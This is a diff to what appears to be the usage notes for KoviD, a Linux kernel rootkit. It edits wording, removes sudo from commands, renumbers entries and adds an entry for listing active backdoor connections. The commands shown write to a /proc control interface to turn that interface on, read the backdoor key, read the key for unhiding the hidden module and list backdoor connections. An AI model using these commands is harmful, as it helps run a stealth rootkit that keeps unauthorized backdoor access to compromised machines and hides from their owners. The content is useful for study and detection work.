@@ -1,8 +1,7 @@
 # Assuming KoviD interface name is /proc/test
 # @See Makefile
 
-# In DEPLOY mode, you'll need
-# root for R/W /proc/test
+# In DEPLOY mode R/W actions need root permissions
 
 #1 /proc interface turn on
     $ kill -SIGCONT 31337
@@ -93,10 +92,15 @@
 
 #21 Read backdoor key
     # This works in DEBUG mode only.
-    $ sudo echo get-bdkey > /proc/test
+    $ echo get-bdkey > /proc/test
     $ cat /proc/test
 
-#21 Read hide-module key
+#22 Read hide-module key
     # This works in DEBUG mode only.
-    $ sudo echo get-unhidekey > /proc/test
+    $ echo get-unhidekey > /proc/test
     $ cat /proc/test
+
+#23 List active back-door connections
+    # This works in DEBUG mode only.
+    $ echo list-backdoor > /proc/test
+    $ dmesg
